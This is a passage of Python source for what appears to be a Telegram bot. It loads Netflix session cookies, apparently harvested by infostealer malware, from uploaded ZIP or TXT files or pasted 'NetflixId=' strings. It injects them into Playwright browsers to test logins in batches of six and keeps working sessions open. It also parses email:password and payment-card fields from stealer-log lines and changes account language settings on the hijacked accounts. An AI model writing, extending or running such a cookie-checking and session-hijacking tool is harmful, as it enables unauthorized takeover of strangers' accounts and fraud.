            # Parse cookies - handle both tab-separated and NetflixId format
            cookies = []
            
            # Check if this is NetflixId format (from TXT files)
            if 'NetflixId=' in cookie_data['content'] and 'SecureNetflixId=' in cookie_data['content']:
                # Use the original content for TXT files
                cookie_content = cookie_data.get('original_content', cookie_data['content'])
                # Convert to tab format for Playwright
                tab_format = convert_netflix_cookies_to_tab_format(cookie_content)
                lines = tab_format.strip().split('\n')
            else:
                # Use tab-separated format (from ZIP files)
                lines = cookie_data['content'].strip().split('\n')
            
            for line in lines:
                if line.strip() and '\t' in line:
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        cookie = {
                            'name': parts[5],
                            'value': parts[6],
                            'domain': parts[0],
                            'path': parts[2]
                        }
                        cookies.append(cookie)
            
            # Set cookies
            await context_instance.add_cookies(cookies)
            
            # Navigate to Netflix
            await page.goto('https://www.netflix.com/in/login', wait_until='domcontentloaded', timeout=30000)
            await page.wait_for_load_state('networkidle', timeout=30000)
            await page.wait_for_timeout(5000)
            
            # Check if login successful
            current_url = page.url
            if '/browse' in current_url or '/browser' in current_url:
                # Navigate to account profiles
                await page.goto('https://www.netflix.com/account/profiles', wait_until='domcontentloaded', timeout=30000)
                await page.wait_for_load_state('networkidle', timeout=30000)
                await page.wait_for_timeout(3000)
                
                # Click the first profile (usually the main profile)
                try:
                    # Look for the first profile button with multiple selectors
                    profile_selectors = [
                        '[data-uia="menu-card"]',
                        '[data-uia="menu-card+*"]',
                        'button[data-uia*="menu-card"]',
                        'div[data-uia*="menu-card"]',
                        'a[data-uia*="menu-card"]'
                    ]
                    
                    profile_button = None
                    for selector in profile_selectors:
                        try:
                            profile_button = await page.wait_for_selector(selector, timeout=5000)
                            if profile_button:
                                break
                        except:
                            continue
                    
                    if profile_button:
                        await profile_button.click()
                        await page.wait_for_timeout(3000)
                        
                        # Navigate to language settings
                        await page.goto('https://www.netflix.com/account', wait_until='domcontentloaded', timeout=30000)
                        await page.wait_for_load_state('networkidle', timeout=30000)
                        await page.wait_for_timeout(3000)
                        
                        # Click on language settings with multiple selectors
                        try:
                            language_selectors = [
                                '[data-uia="profile-settings-page+preferences-card+languages+PressableListItem"]',
                                '[data-uia*="languages+PressableListItem"]',
                                '[data-uia*="languages"]',
                                'button[data-uia*="languages"]',
                                'div[data-uia*="languages"]',
                                'a[data-uia*="languages"]',
                                'li[data-uia*="languages"]'
                            ]
                            
                            language_button = None
                            for selector in language_selectors:
                                try:
                                    language_button = await page.wait_for_selector(selector, timeout=5000)
                                    if language_button:
                                        break
                                except:
                                    continue
                            
                            if language_button:
                                await language_button.click()
                                await page.wait_for_timeout(3000)
                                
                                # Select English from dropdown with multiple approaches
                                try:
                                    # Wait for the dropdown to be available with multiple selectors
                                    dropdown_selectors = [
                                        '[data-uia="language-settings-page+display-language-dropdown+combobox"]',
                                        '[data-uia*="display-language-dropdown"]',
                                        '[data-uia*="language-dropdown"]',
                                        'select[data-uia*="language"]',
                                        'select[aria-label*="language"]',
                                        'select[name*="language"]'
                                    ]
                                    
                                    dropdown = None
                                    for selector in dropdown_selectors:
                                        try:
                                            dropdown = await page.wait_for_selector(selector, timeout=5000)
                                            if dropdown:
                                                break
                                        except:
                                            continue
                                    
                                    if dropdown:
                                        # Try to click the dropdown first
                                        try:
                                            await dropdown.click()
                                            await page.wait_for_timeout(1000)
                                        except:
                                            pass
                                        
                                        # Try multiple ways to select English
                                        english_selected = False
                                        
                                        # Method 1: Direct option selection
                                        try:
                                            english_option = await page.wait_for_selector('option[value="English"]', timeout=5000)
                                            if english_option:
                                                await english_option.click()
                                                english_selected = True
                                                await page.wait_for_timeout(1000)
                                        except:
                                            pass
                                        
                                        # Method 2: Using select element
                                        if not english_selected:
                                            try:
                                                await page.select_option('select', 'English')
                                                english_selected = True
                                                await page.wait_for_timeout(1000)
                                            except:
                                                pass
                                        
                                        # Method 3: Using keyboard navigation
                                        if not english_selected:
                                            try:
                                                await dropdown.focus()
                                                await page.keyboard.press('ArrowDown')
                                                await page.wait_for_timeout(500)
                                                await page.keyboard.press('Enter')
                                                english_selected = True
                                                await page.wait_for_timeout(1000)
                                            except:
                                                pass
                                        
                                        if english_selected:
                                            # Click save button with multiple selectors
                                            save_selectors = [
                                                '[data-uia="language-settings-page+save-button"]',
                                                '[data-uia*="save-button"]',
                                                'button[data-uia*="save"]',
                                                'button[type="submit"]',
                                                'button:has-text("保存")',
                                                'button:has-text("Save")'
                                            ]
                                            
                                            save_button = None
                                            for selector in save_selectors:
                                                try:
                                                    save_button = await page.wait_for_selector(selector, timeout=5000)
                                                    if save_button:
                                                        break
                                                except:
                                                    continue
                                            
                                            if save_button:
                                                await save_button.click()
                                                await page.wait_for_timeout(3000)
                                                
                                                # Navigate back to account page
                                                await page.goto('https://www.netflix.com/account', wait_until='domcontentloaded', timeout=30000)
                                                await page.wait_for_load_state('networkidle', timeout=30000)
                                                
                                                await context.bot.send_message(
                                                    chat_id=update.effective_chat.id,
                                                    text=f"✅ Session {session_number}: Language changed to English successfully!"
                                                )
                                            else:
                                                await context.bot.send_message(
                                                    chat_id=update.effective_chat.id,
                                                    text=f"❌ Session {session_number}: Save button not found"
                                                )
                                        else:
                                            await context.bot.send_message(
                                                chat_id=update.effective_chat.id,
                                                text=f"❌ Session {session_number}: Could not select English option"
                                            )
                                    else:
                                        await context.bot.send_message(
                                            chat_id=update.effective_chat.id,
                                            text=f"❌ Session {session_number}: Language dropdown not found"
                                        )
                                except Exception as e:
                                    await context.bot.send_message(
                                        chat_id=update.effective_chat.id,
                                        text=f"❌ Session {session_number}: Error in language selection - {str(e)[:50]}..."
                                    )
                            else:
                                await context.bot.send_message(
                                    chat_id=update.effective_chat.id,
                                    text=f"❌ Session {session_number}: Language settings button not found"
                                )
                        except Exception as e:
                            await context.bot.send_message(
                                chat_id=update.effective_chat.id,
                                text=f"❌ Session {session_number}: Error accessing language settings - {str(e)[:50]}..."
                            )
                    else:
                        await context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text=f"❌ Session {session_number}: Profile button not found"
                        )
                except Exception as e:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"❌ Session {session_number}: Error clicking profile - {str(e)[:50]}..."
                    )
            else:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ Session {session_number}: Login failed, cannot translate"
                )
            
            # IMPORTANT: DO NOT CLOSE BROWSER - Let user close manually
            # await browser.close()  # This line is commented out to prevent auto-close
            
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ Error translating Session {session_number}: {str(e)[:50]}..."
        )

async def handle_netflix_id_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle Netflix ID messages that start with NetflixId=""" 
    try:
        text = update.message.text.strip()
        
        # Check if the message starts with NetflixId=
        if text.startswith('NetflixId='):
            # Send processing message
            processing_msg = await update.message.reply_text("🎬 Processing Netflix ID... Please wait.")
            
            try:
                # Create a temporary file with the Netflix ID content
                temp_dir = tempfile.mkdtemp()
                temp_file_path = os.path.join(temp_dir, "netflix_id.txt")
                
                # Write the Netflix ID content to the file
                with open(temp_file_path, 'w', encoding='utf-8') as f:
                    f.write(text)
                
                # Create a cookie data structure similar to what we get from ZIP files
                cookie_data = {
                    'name': 'Netflix_ID_Session',
                    'content': text,
                    'original_content': text
                }
                
                # Convert Netflix ID format to tab-separated format for browser using advanced pattern handling
                tab_format = handle_netflix_id_patterns(text)
                
                # Create a list with single cookie for processing
                cookies_list = [{
                    'name': 'Netflix_ID_Session',
                    'content': tab_format,
                    'original_content': text
                }]
                
                # Open the session in debug mode
                await open_cookies_in_debug_mode(cookies_list, update, context, 0, 1)
                
                # Clean up temporary directory
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
                    
            except Exception as e:
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=processing_msg.message_id,
                    text=f"❌ Error processing Netflix ID: {str(e)[:50]}..."
                )
                # Clean up temporary directory
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
        else:
            # If it doesn't start with NetflixId=, send default message
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="📝 Please send a ZIP file with Netflix cookies, a TXT file for analysis, or a Netflix ID message to get started!"
            )
            
    except Exception as e:
        logger.error(f"Error in handle_netflix_id_message: {e}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ Error processing Netflix ID message. Please try again."
        )

def parse_complex_netflix_id(netflix_id_text):
    """Parse complex Netflix ID patterns and convert to browser-compatible format"""
    try:
        import urllib.parse
        import re
        
        # Clean the input text
        text = netflix_id_text.strip()
        
        # Remove any extra text before NetflixId=
        if 'NetflixId=' in text:
            start_idx = text.find('NetflixId=')
            text = text[start_idx:]
        
        # Parse the Netflix ID components
        cookies = []
        processed_cookies = set()  # To avoid duplicates
        
        # Extract NetflixId
        netflix_id_match = re.search(r'NetflixId=([^;]+)', text)
        if netflix_id_match:
            netflix_id_value = netflix_id_match.group(1)
            # URL decode the value
            try:
                decoded_netflix_id = urllib.parse.unquote(netflix_id_value)
            except:
                decoded_netflix_id = netflix_id_value
            cookies.append(f".netflix.com\t.netflix.com\t/\tTRUE\t1735689600\tNetflixId\t{decoded_netflix_id}")
            processed_cookies.add('NetflixId')
        
        # Extract SecureNetflixId
        secure_netflix_id_match = re.search(r'SecureNetflixId=([^;]+)', text)
        if secure_netflix_id_match:
            secure_netflix_id_value = secure_netflix_id_match.group(1)
            # URL decode the value
            try:
                decoded_secure_netflix_id = urllib.parse.unquote(secure_netflix_id_value)
            except:
                decoded_secure_netflix_id = secure_netflix_id_value
            cookies.append(f".netflix.com\t.netflix.com\t/\tTRUE\t1735689600\tSecureNetflixId\t{decoded_secure_netflix_id}")
            processed_cookies.add('SecureNetflixId')
        
        # Extract any other cookies that might be present
        # Look for other cookie patterns like CookieName=value
        other_cookies = re.findall(r'([^=]+)=([^;]+)', text)
        for cookie_name, cookie_value in other_cookies:
            cookie_name = cookie_name.strip()
            # Skip if already processed or if it's a malformed cookie name
            if cookie_name not in processed_cookies and not cookie_name.startswith(';'):
                try:
                    decoded_value = urllib.parse.unquote(cookie_value.strip())
                except:
                    decoded_value = cookie_value.strip()
                cookies.append(f".netflix.com\t.netflix.com\t/\tTRUE\t1735689600\t{cookie_name}\t{decoded_value}")
                processed_cookies.add(cookie_name)
        
        return '\n'.join(cookies)
        
    except Exception as e:
        logger.error(f"Error parsing complex Netflix ID: {e}")
        # Fallback to original conversion
        return convert_netflix_cookies_to_tab_format(netflix_id_text)

def handle_netflix_id_patterns(netflix_id_text):
    """Handle different Netflix ID patterns and formats"""
    try:
        import urllib.parse
        import re
        
        # Clean the input text
        text = netflix_id_text.strip()
        
        # Pattern 1: Standard NetflixId=...;SecureNetflixId=... format
        if 'NetflixId=' in text and 'SecureNetflixId=' in text:
            return parse_complex_netflix_id(text)
        
        # Pattern 2: Just NetflixId=... format
        elif 'NetflixId=' in text:
            return parse_complex_netflix_id(text)
        
        # Pattern 3: URL encoded format with different separators
        elif '%3D' in text or '%26' in text:
            # This might be a URL-encoded format
            try:
                # Try to decode the entire string first
                decoded_text = urllib.parse.unquote(text)
                return parse_complex_netflix_id(decoded_text)
            except:
                return parse_complex_netflix_id(text)
        
        # Pattern 4: JSON-like format or other patterns
        elif '{' in text or '[' in text:
            # Try to extract cookies from JSON-like format
            try:
                # Look for cookie patterns in JSON
                cookie_matches = re.findall(r'"([^"]+)"\s*:\s*"([^"]+)"', text)
                cookies = []
                for cookie_name, cookie_value in cookie_matches:
                    if 'netflix' in cookie_name.lower() or 'id' in cookie_name.lower():
                        try:
                            decoded_value = urllib.parse.unquote(cookie_value)
                        except:
                            decoded_value = cookie_value
                        cookies.append(f"netflix.com\t.netflix.com\t/\tTRUE\t1735689600\t{cookie_name}\t{decoded_value}")
                if cookies:
                    return '\n'.join(cookies)
            except:
                pass
        
        # Pattern 5: Base64 encoded or other formats
        elif len(text) > 100 and '=' in text:
            # Try to parse as a complex cookie string
            return parse_complex_netflix_id(text)
        
        # Fallback: Try the original conversion
        return convert_netflix_cookies_to_tab_format(text)
        
    except Exception as e:
        logger.error(f"Error handling Netflix ID patterns: {e}")
        # Final fallback
        return convert_netflix_cookies_to_tab_format(netflix_id_text)

async def ask_for_start_number(update: Update, context: ContextTypes.DEFAULT_TYPE, data, data_type):
    """Ask user for starting point number for continue view"""
    query = update.callback_query
    
    # Store the data and set waiting state
    global session_state
    session_state['waiting_for_start_number'] = True
    session_state['pending_continue_view_data'] = {
        'data': data,
        'type': data_type
    }
    
    # Send message asking for start number
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="🎬 **Continue View - Choose Starting Point**\n\n"
             "Please send a number to specify which cookie to start from:\n\n"
             "• Send `1` to start from the first cookie\n"
             "• Send `2` to start from the second cookie (skip 1)\n"
             "• Send `50` to start from the 50th cookie\n\n"
             "The system will open 6 sessions starting from your chosen number.\n"
             "If you send a number larger than available cookies, it will start from the last available cookie.",
        parse_mode='Markdown'
    )

async def handle_start_number_response(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle user's response with start number"""
    global session_state
    
    if not session_state['waiting_for_start_number']:
        return False
    
    try:
        # Get the number from user's message
        start_number_text = update.message.text.strip()
        
        if not start_number_text.isdigit():
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Please send a valid number (e.g., 1, 2, 50)."
            )
            return True
        
        start_number = int(start_number_text)
        
        if start_number < 1:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Please send a number greater than 0."
            )
            return True
        
        # Get the pending data
        pending_data = session_state['pending_continue_view_data']
        data = pending_data['data']
        data_type = pending_data['type']
        
        # Reset the waiting state
        session_state['waiting_for_start_number'] = False
        session_state['pending_continue_view_data'] = None
        
        # Process the continue view with the start number
        if data_type == "zip":
            await process_continue_view_with_start_number(update, context, data, start_number)
        elif data_type == "txt":
            await process_continue_view_txt_with_start_number(update, context, data, start_number)
        
        return True
        
    except Exception as e:
        logger.error(f"Error handling start number response: {e}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ Error processing your number. Please try again."
        )
        session_state['waiting_for_start_number'] = False
        session_state['pending_continue_view_data'] = None
        return True

async def process_continue_view_with_start_number(update: Update, context: ContextTypes.DEFAULT_TYPE, zip_data, start_number):
    """Process continue view functionality with custom start number"""
    try:
        # Create temporary directory
        temp_dir = tempfile.mkdtemp()
        
        # Write ZIP content to temporary file
        zip_path = os.path.join(temp_dir, "uploaded.zip")
        with open(zip_path, 'wb') as f:
            f.write(zip_data['zip_content'])
        
        # Extract ZIP file
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        # Find all .txt files
        txt_files = find_txt_files(extract_dir)
        
        # Separate Netflix cookies from other files
        netflix_cookies_list = []
        
        for txt_file in txt_files:
            try:
                # Get relative path from extract directory
                rel_path = os.path.relpath(txt_file, extract_dir)
                
                # Extract only email part if @ is found in filename
                filename = os.path.basename(rel_path)
                if '@' in filename:
                    # Find the complete email address
                    email_part = ""
                    at_index = filename.find('@')
                    if at_index != -1:
                        # Find the start of email (before @)
                        email_start = 0
                        for i in range(at_index - 1, -1, -1):
                            if filename[i] in ['_', '\\', '/']:
                                email_start = i + 1
                                break
                        
                        # Find the end of email (after @, before underscore only)
                        email_end = len(filename)
                        for i in range(at_index + 1, len(filename)):
                            if filename[i] == '_':
                                email_end = i
                                break
                        
                        email_part = filename[email_start:email_end]
                    extracted_name = email_part
                else:
                    # If no @ found, use the original filename
                    extracted_name = filename
                
                # Read the content of the .txt file
                try:
                    with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                        file_content = f.read().strip()
                except Exception as e:
                    file_content = f"Error reading file: {str(e)}"
                
                # Check if it's Netflix cookies
                if file_content and "netflix.com" in file_content.lower():
                    netflix_cookies_list.append({
                        'name': extracted_name,
                        'content': file_content
                    })
            except Exception as e:
                logger.error(f"Error processing file {txt_file}: {e}")
                continue
        
        # Check if start number is valid
        if start_number > len(netflix_cookies_list):
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"⚠️ You requested to start from cookie #{start_number}, but only {len(netflix_cookies_list)} cookies are available.\n"
                     f"Starting from the last available cookie instead."
            )
            start_number = len(netflix_cookies_list)
        
        # Calculate the actual start index (convert to 0-based)
        start_index = start_number - 1
        
        # Open cookies in debug mode with custom start number
        if netflix_cookies_list:
            await open_cookies_in_debug_mode_with_start_number(netflix_cookies_list, update, context, start_index)
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ No Netflix cookies found to open."
            )
        
        # Clean up temporary directory
        try:
            shutil.rmtree(temp_dir)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in continue view with start number: {e}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ Error during continue view: {str(e)}"
        )

async def process_continue_view_txt_with_start_number(update: Update, context: ContextTypes.DEFAULT_TYPE, txt_data, start_number):
    """Process continue view functionality for TXT files with custom start number"""
    try:
        # Get the processed result from txt_data
        result = txt_data['result']
        accounts = result.get('accounts', [])
        
        if not accounts:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ No accounts found to display."
            )
            return
        
        # Create a list of Netflix cookies from the accounts
        netflix_cookies_list = []
        for i, account in enumerate(accounts, 1):
            # Extract Netflix cookies from the account details
            cookies = account.get('cookies', '')
            full_content = account.get('full_content', '')
            
            # Look for Netflix cookie format in cookies field or full_content
            netflix_cookie_content = ""
            
            # First try to extract from cookies field
            if cookies and ('NetflixId=' in cookies and 'SecureNetflixId=' in cookies):
                netflix_cookie_content = cookies
            # If not found in cookies field, try to extract from full_content
            elif full_content and ('NetflixId=' in full_content and 'SecureNetflixId=' in full_content):
                # Extract the cookie part from full_content using regex
                # Look for "Cookies: " or "Cookies = " followed by the cookie string
                cookie_match = re.search(r'Cookies\s*[:=]\s*([^|\n]+)', full_content)
                if cookie_match:
                    netflix_cookie_content = cookie_match.group(1).strip()
                else:
                    # If regex doesn't work, try to find the cookie part manually
                    # Look for the part that contains NetflixId= and SecureNetflixId=
                    lines = full_content.split('\n')
                    for line in lines:
                        if 'NetflixId=' in line and 'SecureNetflixId=' in line:
                            netflix_cookie_content = line.strip()
                            break
            
            # If we found Netflix cookies, convert them to tab-separated format
            if netflix_cookie_content and ('NetflixId=' in netflix_cookie_content and 'SecureNetflixId=' in netflix_cookie_content):
                # Convert Netflix cookie format to tab-separated format
                converted_cookies = convert_netflix_cookies_to_tab_format(netflix_cookie_content)
                netflix_cookies_list.append({
                    'name': f"Account_{i}",
                    'content': converted_cookies
                })
            else:
                # Fallback to the original method if no Netflix cookies found
                cookie_content = account.get('full_content', '')
                if not cookie_content:
                    # If no full_content, create from individual fields
                    email = account.get('email', '')
                    password = account.get('password', '')
                    details = f"Country = {account.get('country', 'Unknown')} | memberPlan = {account.get('member_plan', 'Unknown')} | memberSince = {account.get('member_since', 'Unknown')} | videoQuality = {account.get('video_quality', 'Unknown')} | phonenumber = {account.get('phone_number', 'Unknown')} | maxStreams = {account.get('max_streams', 'Unknown')} | paymentType = {account.get('payment_type', 'Unknown')} | isVerified = {account.get('is_verified', 'Unknown')} | Total_CC = {account.get('total_cc', 'Unknown')} | Cookies = {account.get('cookies', 'Unknown')}"
                    cookie_content = f"{email}:{password}:{details}"
                
                netflix_cookies_list.append({
                    'name': f"Account_{i}",
                    'content': cookie_content
                })
        
        # Check if start number is valid
        if start_number > len(netflix_cookies_list):
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"⚠️ You requested to start from account #{start_number}, but only {len(netflix_cookies_list)} accounts are available.\n"
                     f"Starting from the last available account instead."
            )
            start_number = len(netflix_cookies_list)
        
        # Calculate the actual start index (convert to 0-based)
        start_index = start_number - 1
        
        # Open cookies in debug mode with custom start number
        if netflix_cookies_list:
            await open_cookies_in_debug_mode_with_start_number(netflix_cookies_list, update, context, start_index)
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ No Netflix accounts found to open."
            )
        
        # Clean up temporary directory
        try:
            shutil.rmtree(txt_data['temp_dir'])
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in continue view TXT with start number: {e}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ Error during continue view: {str(e)}"
        )

async def open_cookies_in_debug_mode_with_start_number(cookies_list, update, context, start_index, max_cookies=6):
    """Open multiple cookies in debug mode with custom start index"""
    try:
        global session_state, active_browsers
        
        # Calculate end index for current batch
        end_index = start_index + max_cookies
        cookies_to_open = cookies_list[start_index:end_index]
        
        if not cookies_to_open:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ No cookies to open from the specified starting point."
            )
            return
        
        # Launch browser with debug mode - OUTSIDE async with to prevent auto-close
        p = await async_playwright().start()
        
        # Try different browsers in order of preference
        browser = None
        browser_name = "Unknown"
        
        try:
            # Try Firefox first
            browser = await p.firefox.launch(
                headless=False,
                slow_mo=1000,
                args=[
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
                ]
            )
            browser_name = "Firefox"
        except Exception as e:
            logger.warning(f"Firefox launch failed: {e}")
            try:
                # Try Chromium as fallback
                browser = await p.chromium.launch(
                    headless=False,
                    slow_mo=1000,
                    args=[
                        '--disable-web-security',
                        '--disable-features=VizDisplayCompositor',
                        '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                    ]
                )
                browser_name = "Chromium"
            except Exception as e2:
                logger.warning(f"Chromium launch failed: {e2}")
                try:
                    # Try WebKit as last resort
                    browser = await p.webkit.launch(
                        headless=False,
                        slow_mo=1000
                    )
                    browser_name = "WebKit"
                except Exception as e3:
                    logger.error(f"All browser launches failed: {e3}")
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text="❌ Error: Could not launch any browser. Please install browser binaries using: python -m playwright install"
                    )
                    return
        
        if not browser:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Error: No browser available. Please install browser binaries."
            )
            return
        
        # Update message with browser name and start number
        opening_msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"🎬 Opening {len(cookies_to_open)} cookies starting from #{start_index + 1} using {browser_name}..."
        )
        
        # Store browser reference to prevent garbage collection
        chat_id = update.effective_chat.id
        active_browsers[chat_id] = {
            'browser': browser,
            'playwright': p,
            'contexts': [],
            'pages': []
        }
        
        # Create multiple browser contexts for parallel sessions
        contexts = []
        pages = []
        invalid_cookies = []
        valid_cookies = []
        failed_sessions_data = []
        successful_sessions_data = []
        session_message_ids = []
        
        for i, cookie_data in enumerate(cookies_to_open):
            try:
                # Create new context for each session with smaller size
                context_instance = await browser.new_context(
                    viewport={'width': 800, 'height': 600}
                )
                page = await context_instance.new_page()
                
                # Clear all storage data for fresh session
                await context_instance.clear_cookies()
                
                # Parse cookies
                cookies = []
                lines = cookie_data['content'].strip().split('\n')
                for line in lines:
                    if line.strip() and '\t' in line:
                        parts = line.strip().split('\t')
                        if len(parts) >= 7:
                            cookie = {
                                'name': parts[5],
                                'value': parts[6],
                                'domain': parts[0],
                                'path': parts[2]
                            }
                            cookies.append(cookie)
                
                if not cookies:
                    invalid_cookies.append(f"Session {start_index + i + 1}: {cookie_data['name']} - No valid cookies")
                    continue
                
                # Set cookies
                await context_instance.add_cookies(cookies)
                
                # Navigate to Netflix with retry mechanism
                max_retries = 3
                success = False
                
                for retry in range(max_retries):
                    try:
                        # Navigate to Netflix with different approaches
                        try:
                            # First try: Navigate to main page (better for cookie-based auth)
                            await page.goto('https://www.netflix.com/in/', wait_until='domcontentloaded', timeout=30000)
                        except:
                            # Second try: Direct navigation to login
                            await page.goto('https://www.netflix.com/in/login', wait_until='domcontentloaded', timeout=30000)
                        
                        await page.wait_for_load_state('networkidle', timeout=30000)
                        
                        # Wait for redirect and check login status
                        await page.wait_for_timeout(5000)
                        current_url = page.url
                        
                        # Check for vizdisplaycompositor URL and reload if found
                        if 'vizdisplaycompositor' in current_url.lower():
                            await context.bot.send_message(
                                chat_id=update.effective_chat.id,
                                text=f"🔄 Session {start_index + i + 1}: Reloading due to vizdisplaycompositor URL..."
                            )
                            # Clear cookies and set them again
                            await context_instance.clear_cookies()
                            await context_instance.add_cookies(cookies)
                            await page.reload()
                            await page.wait_for_load_state('networkidle', timeout=30000)
                            await page.wait_for_timeout(5000)
                            current_url = page.url
                        
                        # Check for successful login with multiple indicators
                        if ('/browse' in current_url or '/browser' in current_url or 'netflix.com/browse' in current_url or 
                            'netflix.com/in' in current_url and 'login' not in current_url.lower()):
                            # Navigate to account page
                            await page.goto('https://www.netflix.com/in/account', wait_until='domcontentloaded', timeout=30000)
                            await page.wait_for_load_state('networkidle', timeout=30000)
                            
                            # Send success message with translate button
                            keyboard = [[InlineKeyboardButton("🌐 Translate to English", callback_data=f"translate_{start_index + i + 1}")]]
                            reply_markup = InlineKeyboardMarkup(keyboard)
                            
                            success_msg = await context.bot.send_message(
                                chat_id=update.effective_chat.id,
                                text=f"✅ Session {start_index + i + 1}: {cookie_data['name']} - Success!",
                                reply_markup=reply_markup
                            )
                            session_message_ids.append(success_msg.message_id)
                            valid_cookies.append(f"Session {start_index + i + 1}: {cookie_data['name']}")
                            
                            # Collect successful session data with original index
                            successful_sessions_data.append({
                                'original_index': start_index + i + 1,
                                'name': cookie_data['name'],
                                'content': cookie_data.get('original_content', cookie_data['content']),
                                'status': 'Success'
                            })
                            
                            success = True
                            
                            # Keep browser window open - DO NOT CLOSE
                            contexts.append(context_instance)
                            pages.append(page)
                            break
                        else:
                            # Check if it's a login error page
                            if 'login' in current_url.lower() or 'signin' in current_url.lower():
                                if retry < max_retries - 1:
                                    await page.wait_for_timeout(2000)
                                    continue
                                else:
                                    failed_msg = await context.bot.send_message(
                                        chat_id=update.effective_chat.id,
                                        text=f"❌ Session {start_index + i + 1}: {cookie_data['name']} - Failed after {max_retries} attempts"
                                    )
                                    session_message_ids.append(failed_msg.message_id)
                                    invalid_cookies.append(f"Session {start_index + i + 1}: {cookie_data['name']} - Login failed")
                                    
                                    # Collect failed session data with original index
                                    failed_sessions_data.append({
                                        'original_index': start_index + i + 1,
                                        'name': cookie_data['name'],
                                        'content': cookie_data.get('original_content', cookie_data['content']),
                                        'error_type': 'Login failed'
                                    })
                                    
                                    # Auto-close failed session
                                    try:
                                        await context_instance.close()
                                    except:
                                        pass
                                    break
                            else:
                                # Unknown page, retry
                                if retry < max_retries - 1:
                                    await page.wait_for_timeout(2000)
                                    continue
                                else:
                                    failed_msg = await context.bot.send_message(
                                        chat_id=update.effective_chat.id,
                                        text=f"❌ Session {start_index + i + 1}: {cookie_data['name']} - Page load failed"
                                    )
                                    session_message_ids.append(failed_msg.message_id)
                                    invalid_cookies.append(f"Session {start_index + i + 1}: {cookie_data['name']} - Page load failed")
                                    
                                    # Collect failed session data with original index
                                    failed_sessions_data.append({
                                        'original_index': start_index + i + 1,
                                        'name': cookie_data['name'],
                                        'content': cookie_data.get('original_content', cookie_data['content']),
                                        'error_type': 'Page load failed'
                                    })
                                    
                                    # Auto-close failed session
                                    try:
                                        await context_instance.close()
                                    except:
                                        pass
                                    break
                            
                    except Exception as e:
                        if retry < max_retries - 1:
                            await page.wait_for_timeout(2000)
                            continue
                        else:
                            failed_msg = await context.bot.send_message(
                                chat_id=update.effective_chat.id,
                                text=f"❌ Session {start_index + i + 1}: {cookie_data['name']} - Error: {str(e)[:50]}..."
                            )
                            session_message_ids.append(failed_msg.message_id)
                            invalid_cookies.append(f"Session {start_index + i + 1}: {cookie_data['name']} - Error")
                            
                            # Collect failed session data with original index
                            failed_sessions_data.append({
                                'original_index': start_index + i + 1,
                                'name': cookie_data['name'],
                                'content': cookie_data.get('original_content', cookie_data['content']),
                                'error_type': f'Error: {str(e)[:50]}...'
                            })
                            
                            # Auto-close failed session
                            try:
                                await context_instance.close()
                            except:
                                pass
                            break
                
                # If no success and no browser window added yet, close it
                if not success and context_instance not in contexts:
                    try:
                        await context_instance.close()
                    except:
                        pass
                
            except Exception as e:
                failed_msg = await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ Session {start_index + i + 1}: {cookie_data['name']} - Critical Error"
                )
                session_message_ids.append(failed_msg.message_id)
                invalid_cookies.append(f"Session {start_index + i + 1}: {cookie_data['name']} - Critical Error")
                
                # Collect failed session data with original index
                failed_sessions_data.append({
                    'original_index': start_index + i + 1,
                    'name': cookie_data['name'],
                    'content': cookie_data.get('original_content', cookie_data['content']),
                    'error_type': 'Critical Error'
                })
                
                # Auto-close failed session
                try:
                    if 'context_instance' in locals():
                        await context_instance.close()
                except:
                    pass
        
        # Update global browser manager
        active_browsers[chat_id]['contexts'] = contexts
        active_browsers[chat_id]['pages'] = pages
        
        # Send completion message with navigation buttons and status summary
        total_cookies = len(cookies_list)
        keyboard = []
        
        # Add navigation buttons for next batch
        nav_buttons = []
        if end_index < total_cookies:
            nav_buttons.append(InlineKeyboardButton("➡️ Next 6", callback_data=f"next_batch_{end_index}"))
        
        if nav_buttons:
            keyboard.append(nav_buttons)
        
        # Add translate buttons for successful sessions
        if successful_sessions_data:
            translate_buttons = []
            for session in successful_sessions_data:
                translate_buttons.append(InlineKeyboardButton(f"Tr - {session['original_index']}", callback_data=f"translate_{session['original_index']}"))
            
